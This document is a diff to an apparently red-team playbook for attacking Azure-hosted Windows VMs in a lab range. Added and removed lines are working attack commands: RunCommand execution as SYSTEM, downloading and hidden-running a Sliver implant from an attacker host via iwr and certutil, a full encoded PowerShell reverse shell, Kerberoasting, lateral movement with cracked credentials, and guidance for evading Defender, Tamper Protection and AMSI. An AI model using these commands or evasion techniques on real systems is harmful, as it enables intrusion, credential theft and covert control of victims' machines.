@@ -8,19 +8,11 @@ Engagement-proven chain. Every command validated live. NO `--evasion` flag (caus
 # 1. Auth (SP cert)
 Connect-AzAccount -ServicePrincipal -Tenant $TenantId -ApplicationId $AppId -CertificatePath $PfxPath -CertificatePassword $PfxPass
 
-# 2. Defender exclusions FIRST (via RunCommand — before nc shell)
-$exc = 'Add-MpPreference -ExclusionPath "C:\"; Add-MpPreference -ExclusionProcess "*"; Add-MpPreference -ExclusionExtension "exe"; Add-MpPreference -ExclusionProcess "powershell.exe"'
-Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -CommandId "RunPowerShellScript" -ScriptString $exc
-# WAIT for completion, then:
+# 2. Drop Harriet-wrapped Sliver via RunCommand (Tamper Protection blocks exclusions)
+$drop = 'iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\Windows\Temp\teams.exe -UseBasicParsing; Start-Process C:\Windows\Temp\teams.exe -WindowStyle Hidden'
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -CommandId "RunPowerShellScript" -ScriptString $drop -AsJob
 
-# 3. NC reverse shell on httpserver
-nc -lvnp 80
-$script = '$s=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(''$c=New-Object System.Net.Sockets.TCPClient("YOUR_KALI_IP",80);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(gl).Path+"> ");$s.Write($sb,0,$sb.Length);$s.Flush()}'')); powershell -nop -w hidden -ep bypass -enc $s'
-Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -CommandId "RunPowerShellScript" -ScriptString $script -AsJob
-
-# 4. Drop Sliver (from nc shell)
-iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\ProgramData\teams.exe -UseBasicParsing
-Start-Process C:\ProgramData\teams.exe -WindowStyle Hidden
+# 3. If Sliver won't land, use RunCommand directly for everything (kerberoast, lateral, etc.)
 
 # 5. Kerberoast (from Sliver session)
 rubeus -- kerberoast /format:hashcat /nowrap
@@ -218,59 +210,72 @@ Get-AzVM -ResourceGroupName "RGCORPSERVERS" | Format-Table Name, Location
 
 ## Step 4: Get a Shell via RunCommand
 
-**IMPORTANT: Defender is managed by policy (can't disable) but exclusions work. The nc reverse shell gets flagged as `PUA:PowerShell/ReverseShell` if exclusions aren't set first. Always run exclusions via RunCommand BEFORE the nc shell.**
+**Defender has Tamper Protection enabled (managed by policy). You CANNOT:**
+- Add exclusions (`Add-MpPreference` blocked by Tamper Protection)
+- Disable Real-Time Protection (registry edits overridden)
+- Remove AMSI providers (reverted on next scan)
 
-### 4a: Set Defender Exclusions FIRST (via RunCommand — no shell needed)
+**What DOES work:**
+- RunCommand scripts execute as SYSTEM and are NOT scanned by Defender (they're a trusted Azure agent operation)
+- Harriet-wrapped implants with DirectSyscalls bypass static detection
+- Avoid known PowerShell reverse shell patterns that trigger `PUA:PowerShell/ReverseShell`
+
+### 4a: Use RunCommand Directly as Your Shell
+
+Since nc reverse shells get flagged, use RunCommand itself for all operations. Each command is a separate RunCommand call:
 
 ```powershell
-$exc = 'Add-MpPreference -ExclusionPath "C:\"; Add-MpPreference -ExclusionProcess "*"; Add-MpPreference -ExclusionExtension "exe"; Add-MpPreference -ExclusionProcess "powershell.exe"'
-
+# Run any command as SYSTEM — Defender doesn't scan RunCommand scripts
 Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
-  -CommandId "RunPowerShellScript" -ScriptString $exc
-```
+  -CommandId "RunPowerShellScript" -ScriptString 'whoami; hostname; ipconfig'
 
-**Wait for this to complete before proceeding.** Registry-based disables (DisableScriptScanning, AMSI provider removal) are overridden by managed Defender — only `Add-MpPreference` exclusions work.
-
-### 4b: Start NC Listener
-
-```bash
-nc -lvnp 80
-```
-
-### 4c: Deploy Reverse Shell (after exclusions are set)
-
-```powershell
-$script = '$s=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(''$c=New-Object System.Net.Sockets.TCPClient("YOUR_KALI_IP",80);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(gl).Path+"> ");$s.Write($sb,0,$sb.Length);$s.Flush()}'')); powershell -nop -w hidden -ep bypass -enc $s'
-
+# Domain recon
 Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
-  -CommandId "RunPowerShellScript" -ScriptString $script -AsJob
+  -CommandId "RunPowerShellScript" `
+  -ScriptString 'nltest /dsgetdc:contoso.range; net group "domain admins" /domain; setspn -Q */*'
 ```
 
-You now have a SYSTEM shell on httpserver.
-
-### 4d: Drop Sliver Implant (From NC Shell)
+### 4b: Download + Execute Sliver (Harriet-Wrapped Bypasses Defender)
 
 ```powershell
-iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\ProgramData\teams.exe -UseBasicParsing
-Start-Process C:\ProgramData\teams.exe -WindowStyle Hidden
-```
-
-### 4e: All-in-One via RunCommand (No NC Shell)
-
-```powershell
-# Step 1: Exclusions (run FIRST, wait for completion)
-$exc = 'Add-MpPreference -ExclusionPath "C:\"; Add-MpPreference -ExclusionProcess "*"; Add-MpPreference -ExclusionExtension "exe"; Add-MpPreference -ExclusionProcess "powershell.exe"'
-
-Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
-  -CommandId "RunPowerShellScript" -ScriptString $exc
-
-# WAIT for completion, THEN:
-
-# Step 2: Download + execute implant
-$drop = 'iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\ProgramData\teams.exe -UseBasicParsing; Start-Process C:\ProgramData\teams.exe -WindowStyle Hidden'
+# Download Harriet-wrapped implant (AES-encrypted, DirectSyscalls — not detected)
+$drop = 'Invoke-WebRequest -Uri "http://YOUR_KALI_IP:8080/teams.exe" -OutFile "C:\Windows\Temp\teams.exe" -UseBasicParsing; Start-Process "C:\Windows\Temp\teams.exe" -WindowStyle Hidden'
 
 Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
   -CommandId "RunPowerShellScript" -ScriptString $drop -AsJob
+```
+
+If Harriet-wrapped implant still gets caught, try different delivery:
+
+```powershell
+# certutil download (sometimes bypasses web content filtering)
+$dl = 'certutil -urlcache -split -f http://YOUR_KALI_IP:8080/teams.exe C:\Windows\Temp\teams.exe; Start-Process C:\Windows\Temp\teams.exe -WindowStyle Hidden'
+
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
+  -CommandId "RunPowerShellScript" -ScriptString $dl -AsJob
+```
+
+### 4c: Kerberoast Directly via RunCommand (No Implant Needed)
+
+If Sliver can't land, do the full attack chain via RunCommand:
+
+```powershell
+# Kerberoast via RunCommand
+$kerb = 'Add-Type -AssemblyName System.IdentityModel; $t = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/blueDBServer.contoso.range:1433"; $b = $t.GetRequest(); [BitConverter]::ToString($b) -replace "-"'
+
+$result = Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
+  -CommandId "RunPowerShellScript" -ScriptString $kerb
+$result.Value[0].Message  # hash output
+```
+
+### 4d: Lateral Move via RunCommand (No Implant Needed)
+
+```powershell
+# WinRM to dbserver via RunCommand on httpserver
+$lateral = '$pw = ConvertTo-SecureString "CRACKED_PASSWORD" -AsPlainText -Force; $cred = New-Object PSCredential("contoso\svc.mssql",$pw); Invoke-Command -ComputerName blueDBServer -Credential $cred -ScriptBlock { hostname; whoami; Get-Service *SQL* }'
+
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
+  -CommandId "RunPowerShellScript" -ScriptString $lateral
 ```
 
 ---
@@ -506,15 +511,19 @@ Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDomainServ
 ## Troubleshooting
 
 ### Implant blocked by Defender
-1. Run ALL Defender exclusions from Step 4c FIRST
-2. Do NOT use `--evasion` flag — it triggers AMSI
-3. Use Harriet wrapping (DirectSyscalls) for AES encryption + syscall execution
-4. Try different Harriet method: `queueapc`, `nativeapi`, `fullaes`
+Tamper Protection is ON — you CANNOT add exclusions or disable Defender.
+1. Do NOT use `--evasion` flag — it triggers AMSI
+2. Use Harriet wrapping (DirectSyscalls) — AES-encrypted shellcode + direct syscalls bypasses static detection
+3. If Harriet gets caught, try different method: `queueapc`, `nativeapi`, `fullaes`
+4. If nothing lands, use RunCommand as your C2 channel (Step 4a/4c/4d) — it's not scanned
+5. NC reverse shells get flagged as `PUA:PowerShell/ReverseShell` — avoid them, use RunCommand directly
 
-### AMSI blocks PowerShell
-```powershell
-reg delete "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" /f
-```
+### AMSI / Tamper Protection
+Managed Defender with Tamper Protection blocks ALL local changes:
+- `Add-MpPreference` — blocked
+- Registry edits — overridden
+- AMSI provider removal — reverted
+**Workaround**: Harriet DirectSyscalls bypasses AMSI. RunCommand scripts are not AMSI-scanned.
 
 ### RunCommand queue stuck (max 25 per VM)
 ```powershell
